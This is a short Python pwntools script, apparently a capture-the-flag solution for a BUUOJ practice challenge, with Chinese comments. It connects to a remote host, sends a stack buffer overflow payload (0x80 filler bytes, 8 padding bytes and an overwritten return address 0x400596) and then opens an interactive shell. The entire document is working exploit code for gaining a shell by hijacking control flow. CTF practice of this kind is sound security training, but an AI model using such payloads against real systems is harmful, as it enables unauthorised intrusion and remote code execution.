from pwn import * 
from pwn import p64
import socket

host = 'node4.buuoj.cn'
ip = socket.gethostbyname(host)
r = remote(ip,26150)#远程连接

payload = 'A' * 0x80 + 'a' * 0x8 + p64(0x00400596).decode('unicode_escape')
r.recvuntil("Hello, World\n")#直到接收到Hello,World才执行后面的操作
r.sendline(payload)#发送一行数据

r.interactive()#交互shell
